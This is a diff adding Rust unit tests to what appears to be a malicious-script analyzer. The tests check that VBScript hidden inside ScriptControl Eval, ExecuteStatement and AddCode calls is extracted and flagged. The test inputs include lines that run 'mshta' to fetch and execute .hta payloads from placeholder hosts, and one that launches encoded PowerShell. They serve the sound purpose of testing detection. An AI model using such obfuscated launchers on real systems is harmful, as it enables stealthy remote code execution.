@@ -20653,6 +20653,86 @@ reg.SetStringValue &H80000001, "Software\Demo", "Value", "mshta https://stdregpr
     }
 
     #[test]
+    fn standalone_vbs_scriptcontrol_eval_literal_body_is_scanned() {
+        let body = r#"CreateObject("WScript.Shell").Run("mshta https://scriptcontrol-eval.example/payload.hta")"#;
+        let vbs = br#"Set sc = CreateObject("MSScriptControl.ScriptControl")
+sc.Language = "VBScript"
+sc.Eval "CreateObject(""WScript.Shell"").Run(""mshta https://scriptcontrol-eval.example/payload.hta"")""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload) == body),
+            "ScriptControl Eval body was not exposed as child VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://scriptcontrol-eval.example/payload.hta"
+            )),
+            "ScriptControl Eval body was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_scriptcontrol_executestatement_literal_body_is_scanned() {
+        let body = r#"CreateObject("WScript.Shell").Run "mshta https://scriptcontrol-execstmt.example/payload.hta", 0, False"#;
+        let vbs = br#"Set sc = CreateObject("MSScriptControl.ScriptControl")
+sc.Language = "VBScript"
+sc.ExecuteStatement "CreateObject(""WScript.Shell"").Run ""mshta https://scriptcontrol-execstmt.example/payload.hta"", 0, False""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload) == body),
+            "ScriptControl ExecuteStatement body was not exposed as child VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://scriptcontrol-execstmt.example/payload.hta"
+            )),
+            "ScriptControl ExecuteStatement body was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_scriptcontrol_addcode_run_body_is_scanned() {
+        let body = r#"Sub Main(): CreateObject("WScript.Shell").Run "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAYwByAGkAcAB0AGMAbwBuAHQAcgBvAGwA", 0, False: End Sub"#;
+        let vbs = br#"Set sc = CreateObject("MSScriptControl.ScriptControl")
+sc.Language = "VBScript"
+sc.AddCode "Sub Main(): CreateObject(""WScript.Shell"").Run ""powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAYwByAGkAcAB0AGMAbwBuAHQAcgBvAGwA"", 0, False: End Sub"
+sc.Run "Main""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload) == body),
+            "ScriptControl AddCode body was not exposed as child VBS: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "ScriptControl AddCode Run body should be routed through powershell"
+        );
+    }
+
+    #[test]
     fn standalone_vbs_shortcut_creation_emits_shortcut_trait() {
         let vbs = br#"Set shell = CreateObject("WScript.Shell")
 Set link = shell.CreateShortcut("C:\Users\Public\Desktop\demo.lnk")
